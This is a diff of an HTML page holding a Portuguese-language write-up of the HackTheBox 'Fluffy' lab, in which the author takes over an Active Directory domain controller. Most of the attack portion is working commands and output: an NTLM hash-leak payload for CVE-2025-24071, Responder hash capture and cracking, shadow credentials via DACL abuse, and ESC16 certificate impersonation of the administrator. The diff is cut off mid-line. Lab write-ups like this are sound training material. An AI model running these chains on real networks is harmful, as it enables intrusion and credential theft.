@@ -5,44 +5,28 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="stylesheet" href="../../css/css-paper/paper.css">
-    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
-    <title>paper - Compromising a Domain Controller (HTB fluffy)</title>
+        <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
+    <title>Compromising a Domain Controller (HTB
+fluffy) - pwnbuffer.org</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
-    <script>
-        hljs.highlightAll();
-        //  hljs.configure({languages: []});
+  <script>
+      hljs.highlightAll();
+    //  hljs.configure({languages: []});
     </script>
+
 </head>
 
 <body>
     <div class="main_container">
         <header class="header_top">
             <div class="left-section">
-                <a href="../../index.html" class="menu-link">[ 0xh0m3 ]</a>
-                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
-                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
+                <a href="../../index.html" class="menu-link">/home</a>
+                <a href="../../p/papers.html" class="menu-link">/papers</a>
+                <a href="./a/about.html" class="menu-link">/about-us</a>
+                <a href="./w/worms.html" class="menu-link">/worms</a>
             </div>
             <div class="right-section">
-                <span class="glitch-text">0xPwnbuff3r</span>
+                <span class="glitch-text">pwn@buff3r</span>
             </div>
 
         </header>
@@ -50,16 +34,16 @@
         <main class="content">
             <h1 class="pwntitle">Compromising a Domain Controller (HTB
 fluffy)</h1>
-            <article class="article">
-                <p><code>Author</code>: Nullbyte</p>
-                <p>Fluffy é uma máquina do hackthebox que ataca os
-                princípios de uma rede corporativa, explorando cada
-                detalhe de vulnerabilidade, cada byte, cada bit.</p>
-                <h2 id="lets-hack">Let's hack!</h2>
-                <p><strong>Credenciais:</strong></p>
-                <p><code>"As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!"</code></p>
-                <h4 id="recon">Recon</h4>
-                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+            <article>
+                  <p><code>Author:</code> Nullbyte</p>
+                  <p>Fluffy é uma máquina do HackTheBox que ataca os
+                  princípios de uma rede corporativa, explorando cada
+                  detalhe de vulnerabilidade, cada byte, cada bit.</p>
+                  <h3 id="lets-hack">Let's hack!</h3>
+                  <p><strong>Credenciais:</strong></p>
+                  <p><code>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!</code></p>
+                  <h2 id="recon">Recon</h2>
+                  <pre><code>┌──(root㉿kali)-[/tmp]
 └─# scan fluffy.htb
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -206,19 +190,20 @@ TRACEROUTE (using port 49690/tcp)
 HOP RTT       ADDRESS
 1   144.00 ms 10.10.14.1 (10.10.14.1)
 2   145.84 ms fluffy.htb (10.129.85.197)</code></pre>
-                <p><code>[0x0539] &gt;</code> Analisando, podemos
-                observar algumas portas que provavelmente serão muito
-                importantes: <code>445</code>, <code>389</code>,
-                <code>88</code>, <code>5985</code>. Iniciaremos
-                analisando o serviço <a
-                href="https://en.wikipedia.org/wiki/Server_Message_Block">SMB</a>
-                utilizado para compartilhamento de arquivos e até mesmo
-                execução de código remoto (Dependendo do usuário).</p>
-                <ul>
-                <li><strong>Trick</strong>: usando <code>nxc</code> para
-                enumerar o smb</li>
-                </ul>
-                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+                  <p><code>[0x0539] &gt;</code> Analisando, podemos
+                  observar algumas portas que provavelmente serão muito
+                  importantes: <code>445</code>, <code>389</code>,
+                  <code>88</code>, <code>5985</code>. Iniciaremos
+                  analisando o serviço <a
+                  href="https://en.wikipedia.org/wiki/Server_Message_Block">SMB</a>
+                  utilizado para compartilhamento de arquivos e até
+                  mesmo execução de código remoto (dependendo do
+                  usuário).</p>
+                  <ul>
+                  <li><strong>Trick</strong>: usando <code>nxc</code>
+                  para enumerar o smb</li>
+                  </ul>
+                  <pre><code>┌──(root㉿kali)-[/tmp]
 └─# nxc smb fluffy.htb -u &#39;j.fleischman&#39; -p &#39;J0elTHEM4n1990!&#39; --shares
 SMB         10.129.85.197   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
 SMB         10.129.85.197   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
@@ -231,7 +216,7 @@ SMB         10.129.85.197   445    DC01             IPC$            READ        
 SMB         10.129.85.197   445    DC01             IT              READ,WRITE      
 SMB         10.129.85.197   445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.129.85.197   445    DC01             SYSVOL          READ            Logon server share</code></pre>
-                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+                  <pre><code>┌──(root㉿kali)-[/tmp]
 └─# smbclient //fluffy.htb/IT -U &#39;j.fleischman&#39; -c &#39;ls&#39; 
 Password for [WORKGROUP\j.fleischman]:
   .                                   D        0  Tue Jul 29 23:23:33 2025
@@ -243,7 +228,7 @@ Password for [WORKGROUP\j.fleischman]:
   Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
 
         5842943 blocks of size 4096. 1844516 blocks available</code></pre>
-                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+                  <pre><code>┌──(root㉿kali)-[/tmp]
 └─# smbclient //fluffy.htb/IT -U &#39;j.fleischman&#39; -c &#39;ls;get Upgrade_Notice.pdf&#39;
 Password for [WORKGROUP\j.fleischman]:
   .                                   D        0  Tue Jul 29 23:23:33 2025
@@ -256,15 +241,15 @@ Password for [WORKGROUP\j.fleischman]:
 
         5842943 blocks of size 4096. 1880881 blocks available
 getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (148.2 KiloBytes/sec) (average 148.2 KiloBytes/sec)</code></pre>
-                <p><code>[0x0539] &gt;</code> Abrindo o <code>PDF</code>
-                podemos descobrir que alguma das vulnerabilidades
-                listadas está presente na rede. Nós temos uma
-                vulnerabilidade muito interessante, buscando na internet
-                achamos uma <code>CVE</code> que nos permite ganhar
-                algum acesso.</p>
-                <p><code>CVE-2025-24071</code> -&gt; <a
-                href="https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom">https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom</a></p>
-                <pre class="plaintext"><code>              .7
+                  <p><code>[0x0539] &gt;</code> Abrindo o
+                  <code>PDF</code> podemos descobrir que alguma das
+                  vulnerabilidades listadas está presente na rede. Nós
+                  temos uma vulnerabilidade muito interessante; buscando
+                  na internet achamos uma <code>CVE</code> que nos
+                  permite ganhar algum acesso.</p>
+                  <p><code>CVE-2025-24071</code> -&gt; <a
+                  href="https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom">https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom</a></p>
+                  <pre><code>              .7
             .&#39;/
            / /
           / /
@@ -296,11 +281,12 @@ getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (148.2 Kil
                          &quot;-.__&quot;&quot;\_|&quot;-.__.-&quot;./      \ l
                           &quot;.__&quot;&quot;&quot;&gt;G&gt;-.__.-&quot;&gt;       .--,_
                               &quot;&quot;  G</code></pre>
-                <h2 id="-exploitation-vulnerabilities-">-Exploitation
-                Vulnerabilities-</h2>
-                <p><code>[0x0539] &gt;</code> Executando os passos para
-                gerar a carga útil com <code>metasploit</code></p>
-                <pre class="bash"><code>msf6 auxiliary(server/ntlm_hash_leak) &gt; options
+                  <h2 id="-exploitation-vulnerabilities-">-Exploitation
+                  Vulnerabilities-</h2>
+                  <p><code>[0x0539] &gt;</code> Executando os passos
+                  para gerar a carga útil com
+                  <code>metasploit</code></p>
+                  <pre><code>msf6 auxiliary(server/ntlm_hash_leak) &gt; options
 
 Module options (auxiliary/server/ntlm_hash_leak):
 
@@ -324,9 +310,9 @@ msf6 auxiliary(server/ntlm_hash_leak) &gt; exploit
 msf6 auxiliary(server/ntlm_hash_leak) &gt; pwd
 [*] exec: pwd
 /root/windows/ctf/fluffy/CVE-2025-24071-msfvenom</code></pre>
-                <p><code>[0x0539] &gt;</code> Fazendo o upload do
-                payload criado pelo metasploit</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Fazendo o upload do
+                  payload criado pelo <code>metasploit</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# ls
 exploit.zip  ntlm_hash_leak.rb  README.md
                                                                                                          
@@ -336,10 +322,11 @@ Password for [WORKGROUP\j.fleischman]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; put exploit.zip
 putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
-smb: \&gt; </code></pre>
-                <p><code>[0x0539] &gt;</code> ""Sniffando"" a rede até
-                obter a hash do usuário <code>p.agila</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[/home/nullbyte]
+smb: \&gt; 
+</code></pre>
+                  <p><code>[0x0539] &gt;</code> ""Sniffando"" a rede até
+                  obter a hash do usuário <code>p.agila</code></p>
+                  <pre><code>┌──(root㉿kali)-[/home/nullbyte]
 └─# responder -I tun0 
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -361,9 +348,9 @@ smb: \&gt; </code></pre>
 [SMB] NTLMv2-SSP Client   : 10.129.85.197
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:HIDDEN</code></pre>
-                <p><code>[0x0539] &gt;</code> "Quebrando" a hash do
-                usuário <code>p.agila</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> "Quebrando" a hash do
+                  usuário <code>p.agila</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_p.agila 
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
@@ -373,9 +360,9 @@ prometheusx-303  (p.agila)
 1g 0:00:00:10 DONE (2025-07-29 17:42) 0.09354g/s 422579p/s 422579c/s 422579C/s proquis..prom pics
 Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
 Session completed. </code></pre>
-                <p><code>[0x0539] &gt;</code> Vendo quais permissões
-                tenho com o usuário <code>p.agila</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Vendo quais permissões
+                  tenho com o usuário <code>p.agila</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; get writable
 
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb
@@ -388,47 +375,50 @@ distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
 permission: CREATE_CHILD; WRITE
 OWNER: WRITE
 DACL: WRITE</code></pre>
-                <p><code>[0x0539] &gt;</code> O usuário
-                <code>p.agila</code> tem algumas permissões importantes,
-                como <code>DACL</code>, <code>OWNER</code>.
-                <code>[0x0539] &gt;</code> Podemos então tomar controle
-                do grupo e assim obter controle total dos objetos do
-                grupo, e sendo proprietário, obtemos privilégio de todas
-                as contas que pertencem a esse grupo!</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> O usuário
+                  <code>p.agila</code> tem algumas permissões
+                  importantes, como <code>DACL</code>,
+                  <code>OWNER</code>.<br />
+                  <code>[0x0539] &gt;</code> Podemos então tomar
+                  controle do grupo e assim obter controle total dos
+                  objetos do grupo, e sendo proprietário, obtemos
+                  privilégio de todas as contas que pertencem a esse
+                  grupo!</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; set owner &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
 
 [+] Old owner S-1-5-21-497550768-2797716248-2627064577-512 is now replaced by p.agila on CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
-                <p><code>[0x0539] &gt;</code> adicionando permissão
-                geral sobre o grupo <code>Service Accounts</code> com o
-                usuário <code>p.agila</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> adicionando permissão
+                  geral sobre o grupo <code>Service Accounts</code> com
+                  o usuário <code>p.agila</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; add genericAll &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
 
 [+] p.agila has now GenericAll on CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
-                <p><code>[0x0539] &gt;</code> adicionando o usuário
-                <code>p.agila</code> no grupo
-                <code>Service Accounts</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> adicionando o usuário
+                  <code>p.agila</code> no grupo
+                  <code>Service Accounts</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; add groupMember &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
 [+] p.agila added to CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
-                <p><code>[0x0539] &gt;</code> Identificando membros do
-                grupo <code>Service Accounts</code>.</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Identificando membros do
+                  grupo <code>Service Accounts</code>.</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# ldapsearch -x -H ldap://10.129.85.197 -D &#39;p.agila@fluffy.htb&#39; -w &#39;prometheusx-303&#39; -b &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; | grep member
 member: CN=winrm service,CN=Users,DC=fluffy,DC=htb
 member: CN=ldap service,CN=Users,DC=fluffy,DC=htb
 member: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</code></pre>
-                <p><code>[0x0539] &gt;</code> Pelo que podemos ver,
-                temos <code>3</code> membros, e os membros têm nomes de
-                serviços. Dois deles são interessantes para nós:
-                <code>winrm</code>,
-                <code>certificate authority</code>.</p>
-                <hr />
-                <p><code>[0x0539] &gt;</code> Lembram que temos
-                permissão de DACL? Podemos fazer um ataque de shadow
-                credential com essas contas de serviço!</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Pelo que podemos ver,
+                  temos <code>3</code> membros, e os membros têm nomes
+                  de serviços. Dois deles são interessantes para nós:
+                  <code>winrm</code>,
+                  <code>certificate authority</code>.</p>
+                  <hr />
+                  <p><code>[0x0539] &gt;</code> Lembram que temos
+                  permissão de <code>DACL</code>? Podemos fazer um
+                  ataque de <em>shadow credential</em> com essas contas
+                  de serviço!</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# pywhisker --dc-host 10.129.85.197 -d fluffy.htb -u p.agila -p &#39;prometheusx-303&#39; /
  -t winrm_svc -a add
 
@@ -446,14 +436,15 @@ member: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</code></pre>
 [+] Saved PFX (#PKCS12) certificate &amp; key at path: Qhe8WZes.pfx
 [*] Must be used with password: 4xN1LvZWPxl2VRHyampW
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</code></pre>
-                <p><code>[0x0539] &gt;</code> Após obter o PFX nesse
-                caso vou fazer com a winrm e podemos se conectar por ela
-                assim podemos obter nossa flag de user.txt!</p>
-                <p>lembrando que os certificados no AD são bastante
-                importantentes, se obtermos um certificado de algum
-                usuário podemos obter a hash dele atraves de um simples
-                certificado!</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Após obter o
+                  <code>PFX</code> — nesse caso vou fazer com a
+                  <code>winrm</code> — podemos nos conectar por ela e
+                  assim obter nossa flag <code>user.txt</code>!</p>
+                  <p>Lembrando que os certificados no <code>AD</code>
+                  são bastante importantes: se obtermos um certificado
+                  de algum usuário, podemos obter a hash dele através de
+                  um simples certificado!</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# certipy auth -pfx Qhe8WZes.pfx -password &quot;4xN1LvZWPxl2VRHyampW&quot; -username &#39;winrm_svc&#39; /
 -dc-ip 10.129.85.197 -ns 10.129.85.197 -domain fluffy.htb -no-save
 
@@ -467,9 +458,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Trying to retrieve NT hash for &#39;winrm_svc&#39;
 [*] Got hash for &#39;winrm_svc@fluffy.htb&#39;: </code></pre>
-                <p><code>[0x0539] &gt;</code> pegando a
-                <code>Flag</code>!</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> pegando a
+                  <code>Flag</code>!</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# evil-winrm -i 10.129.85.197 -u &#39;winrm_svc&#39; -p &#39;hash ntlm&#39;
                                         
 Evil-WinRM shell v3.7
@@ -494,10 +485,10 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt
 0c169e83b26e682d HIDDEN HAHAHAHA
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; </code></pre>
-                <p><code>[0x0539] &gt;</code> Agora vamos ver a conta de
-                serviço <code>certificate authority</code>, e ver quais
-                permissões ela tem.</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> Agora vamos ver a conta
+                  de serviço <code>certificate authority</code>, e ver
+                  quais permissões ela tem.</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; / 
 -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -user &#39;ca_svc&#39; read
 
@@ -529,9 +520,10 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     userAccountControl                  : 66048
     whenCreated                         : 2025-04-17T16:07:50+00:00
     whenChanged                         : 2025-08-01T21:53:02+00:00</code></pre>
-                <p><code>[0x0539] &gt;</code> Vamos gerar um ticket TGT
-                para conseguir logar na conta em qualquer serviço :)</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Vamos gerar um ticket
+                  <code>TGT</code> para conseguir logar na conta em
+                  qualquer serviço :)</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# python3 /root/windows/python3-impacket/examples/getTGT.py fluffy.htb/ca_svc / 
 -hashes &#39;hash ntml&#39;
 
@@ -550,25 +542,29 @@ Default principal: ca_svc@FLUFFY.HTB
 Valid starting       Expires              Service principal
 07/30/2025 01:49:13  07/30/2025 11:49:13  krbtgt/FLUFFY.HTB@FLUFFY.HTB
     renew until 07/31/2025 01:49:12</code></pre>
-                <p><code>[0x0539] &gt;</code> Verificando templates
-                vulneraveis agora que temos acesso a conta
-                <code>CA_SVC</code> podemos explorar Certificados!
-                podemos ver que tem vulnerabilidadede no certificado
-                chamada <code>ESC16</code>, essa vulnerabilidade de
-                forma resumida permite gerar certificado se passando por
-                qualquer usuário alterando a <code>UPN</code> vamos ao
-                exemplo, somos o usuário ca_svc temos controle sobre o
-                <code>ADCS</code>, vamos adicionar o <code>UPN</code> do
-                administrator a nossa conta <code>ca_svc</code> assim
-                podemos solicitar certificado no template user, como o
-                <code>UPN</code> é do administrator o usuário
-                <code>ca_svc</code> acaba se passando pelo administrator
-                e obtemos o pfx do administrator. segue abaixo a cadeia
-                de ataques. se tiver interresado em entender de forma
-                detalhada:</p>
-                <p><a
-                href="https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6">https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6</a></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+                  <p><code>[0x0539] &gt;</code> Verificando templates
+                  vulneráveis — agora que temos acesso à conta
+                  <code>CA_SVC</code> podemos explorar certificados!
+                  Podemos ver que tem vulnerabilidade no certificado
+                  chamada <code>ESC16</code>. Essa vulnerabilidade, de
+                  forma resumida, permite gerar certificado se passando
+                  por qualquer usuário alterando a <code>UPN</code>.</p>
+                  <p>Vamos ao exemplo: somos o usuário
+                  <code>ca_svc</code>, temos controle sobre o
+                  <code>ADCS</code>. Vamos adicionar o <code>UPN</code>
+                  do <code>administrator</code> à nossa conta
+                  <code>ca_svc</code> — assim podemos solicitar
+                  certificado no template <code>user</code>. Como o
+                  <code>UPN</code> é do <code>administrator</code>, o
+                  usuário <code>ca_svc</code> acaba se passando pelo
+                  <code>administrator</code> e obtemos o
+                  <code>PFX</code> do <code>administrator</code>. Segue
+                  abaixo a cadeia de ataques.</p>
+                  <p>Se tiver interessado em entender de forma
+                  detalhada:<br />
+                  <a
+                  href="https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6">https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6</a></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
 └─# certipy find -username &#39;ca_svc&#39; -k -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb
 
 Certificate Authorities
@@ -601,10 +597,10 @@ Certificate Authorities
         Enroll                          : FLUFFY.HTB\Cert Publishers
     [!] Vulnerabilities
       ESC16                             : Security Extension is disabled.</code></pre>
-                <p><code>[0x0539] &gt;</code> Explorando o
-                <code>ESC16</code>, e mudando o <code>UPN</code> da
-                <code>CA_SVC</code></p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> Explorando o
+                  <code>ESC16</code>, e mudando o <code>UPN</code> da
+                  <code>CA_SVC</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; /
 -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -upn &#39;administrator&#39; /
 -user &#39;ca_svc&#39; update
@@ -629,9 +625,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Updating user &#39;ca_svc&#39;:
     userPrincipalName                   : administrator
 [*] Successfully updated &#39;ca_svc&#39;</code></pre>
-                <p><code>[0x0539] &gt;</code> confirmando se está setado
-                o <code>UPN</code> do administrator</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> confirmando se está
+                  setado o <code>UPN</code> do administrator</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; / 
 -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -user &#39;ca_svc&#39; read
 
@@ -663,9 +659,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     userAccountControl                  : 66048
     whenCreated                         : 2025-04-17T16:07:50+00:00
     whenChanged                         : 2025-08-01T21:53:02+00:00</code></pre>
-                <p><code>[0x0539] &gt;</code> obtendo o <code>PFX</code>
-                do administrator</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> obtendo o
+                  <code>PFX</code> do <code>administrator</code></p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy -debug req -username &#39;administrator&#39; -hashes &#39;:hash&#39; -dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -ca &#39;fluffy-DC01-CA&#39; -template &#39;User&#39;
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -690,19 +686,24 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [+] Attempting to write data to &#39;administrator.pfx&#39;
 [+] Data written to &#39;administrator.pfx&#39;
 [*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre>
-                <p><code>[0x0539] &gt;</code> Mudando o <code>UPN</code>
-                para os devidos usuários!</p>
-                <p><code>[0x0539] &gt;</code> Agora temos que se atentar
-                a um detalhe importante para não ter conflito na hora de
-                autenticarmos com o certificado. Temos que voltar o
-                <code>UPN</code> da conta do <code>ca_svc</code> para a
-                <a href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a>
-                ou seja o <code>UPN</code> dele, assim o administrator
-                vai ter o <code>UPN</code> dele mesmo no caso o <a
-                href="mailto:administrator@fluffy.htb">administrator@fluffy.htb</a>,
-                e o <code>ca_svc</code> com o <a
-                href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a>.</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> Mudando o
+                  <code>UPN</code> para os devidos usuários!</p>
+                  <p><code>[0x0539] &gt;</code> Agora temos que nos
+                  atentar a um detalhe importante para não ter conflito
+                  na hora de autenticarmos com o certificado.<br />
+                  Temos que voltar o <code>UPN</code> da conta do
+                  <code>ca_svc</code> para o <a
+                  href="mailto:ca_svc@fluffy.htb"><a
+                  href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a></a>,
+                  ou seja, o <code>UPN</code> dele.<br />
+                  Assim, o <code>administrator</code> vai ter o
+                  <code>UPN</code> dele mesmo, no caso <a
+                  href="mailto:administrator@fluffy.htb"><a
+                  href="mailto:administrator@fluffy.htb">administrator@fluffy.htb</a></a>,<br />
+                  e o <code>ca_svc</code> com o <a
+                  href="mailto:ca_svc@fluffy.htb"><a
